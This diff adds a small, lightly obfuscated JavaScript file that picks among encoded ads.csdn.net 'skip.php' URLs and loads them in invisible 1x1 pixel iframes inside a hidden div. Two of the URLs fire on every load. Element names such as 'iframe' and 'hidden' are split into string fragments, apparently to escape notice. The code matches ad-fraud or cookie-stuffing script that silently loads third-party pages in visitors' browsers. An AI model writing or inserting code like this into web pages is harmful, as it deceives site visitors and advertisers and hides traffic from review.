@@ -1,0 +1,36 @@
+(function(){
+    var a = function () {};
+    a.u = [{"l":"http:\/\/ads.csdn.net\/skip.php?subject=BWwLI11iAGQEIFAMAGsFMVQ9V2NYO1JiUXcHZlVjBiJUN1pyXXIHbwciUzVRDFFoBDRWalYzAzJVYFB2BT5RZwVmCzBdWQBoBDZQbgAwBWBUOFdkWClSIFE9B2ZVaQYLVCJadl07BzIHYVN2USdReAQgVjJWPAN3","r":0.11},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=Vz4LIwA\/DWkHIwBcVT5UYARtATVXNVdiVXMLalBmV3MAYw8nDiEAaAciAGZTDgM6ATECPgRiBTRWZlN1CTJSZFc0CzAABA1lBzUAPlVlVDIEYgE1VyZXJVU5C2pQbFdaAHYPIw5oADAHYQAzU3cDJwEsAnMENgU6ViA=","r":0.28},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=AmsBKQs0VzNUcARYBW5UYFsyADRQPgQyVnALagQyUnZRMl52XHNXPw8qBGJRDFduUmIAPAdhX2wDMlZwATpVYwJhAToLD1c\/VGYEOgU1VD1bOgAxUCEEdlY6C2oEOFJfUSdeclw6V2cPaAQ3UXVXc1J\/AHEHNV9gA3U=","r":0.31},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=UzoOJgk2BWFWcgBcBG9RZQduBDBZOlZtAyVQMQk\/ByNTMA4mW3RTOw4rBmAFWFNqATEEOFA2BzcBOQstAjkFM1MwDjUJDQVtVmQAPgQ0UTgHYAQxWShWJANvUDEJNQcKUyUOIls9U2MObgYwBTdTMwFlBDVQIQdxAXgLewI1BWpTIw==","r":4583.33},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=AWhedlplUDQHIwZaBG9TZ1M6AzcHZFdsU3UDYgk\/UnYFZl52XHNTOwQhVTNWC1duU2MHO1E3UWYHNAEnAToFMwFiXmVaXlA4BzUGOAQ0UzpTNAM3B3ZXJVM\/A2IJNVJfBXNeclw6U2MEYVVmVmRXN1M3BzZRIFEnB34BcQE2BWoBcQ==","r":3611.11}];
+    a.to = function () {
+        if(typeof a.u == "object"){
+            for (var i in a.u) {
+                var r = Math.random();
+                if (r < a.u[i].r)
+                    a.go(a.u[i].l + '&r=' + r);
+            }
+        }
+    };
+    a.go = function (url) {
+        var e = document.createElement("if" + "ra" + "me");
+        e.style.width = "1p" + "x";
+        e.style.height = "1p" + "x";
+        e.style.position = "ab" + "sol" + "ute";
+        e.style.visibility = "hi" + "dden";
+        e.src = url;
+        var t_d = document.createElement("d" + "iv");
+        t_d.appendChild(e);
+        var d_id = "a52b5334d";
+        if (document.getElementById(d_id)) {
+            document.getElementById(d_id).appendChild(t_d);
+        } else {
+            var a_d = document.createElement("d" + "iv");
+            a_d.id = d_id;
+            a_d.style.width = "1p" + "x";
+            a_d.style.height = "1p" + "x";
+            a_d.style.display = "no" + "ne";
+            document.body.appendChild(a_d);
+            document.getElementById(d_id).appendChild(t_d);
+        }
+    };
+    a.to();
+})();
